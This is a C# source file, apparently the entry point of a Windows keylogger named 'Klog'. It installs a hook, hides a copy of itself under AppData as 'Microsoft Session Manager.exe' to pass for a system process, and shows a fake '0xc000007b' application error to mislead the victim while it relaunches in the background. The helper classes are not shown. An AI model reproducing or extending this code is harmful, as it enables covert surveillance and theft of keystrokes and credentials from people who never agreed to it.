using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using System.Drawing;

namespace Klog
{
    public partial class Core
    {
        public static string cur_file = Application.ExecutablePath;
        private static string cur_name = AppDomain.CurrentDomain.FriendlyName;
        public static string hidden_dir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Microsoft";
        public static string new_file = hidden_dir + @"\Microsoft Session Manager.exe";

        public static void Main(string[] args)
        {
            Save c_save = new Save();
            c_save.SetUP();

            Test_Class c_test = new Test_Class();
            c_test.SetHook();

            if (cur_file != new_file) 
            {
                MessageBox.Show("The application was unable to start correctly (0xc000007b). " +
                "Click OK to close the application.", cur_name + " - Application Error",
                MessageBoxButtons.OK, MessageBoxIcon.Error);
            }

            Process[] cur_process = Process.GetProcessesByName("Microsoft Session Manager");

            if (cur_process.Length >= 1)
            {
                Application.Run();
                return;
            }

            Process.Start(new_file);

            Environment.Exit(-1);
        }
    }
}
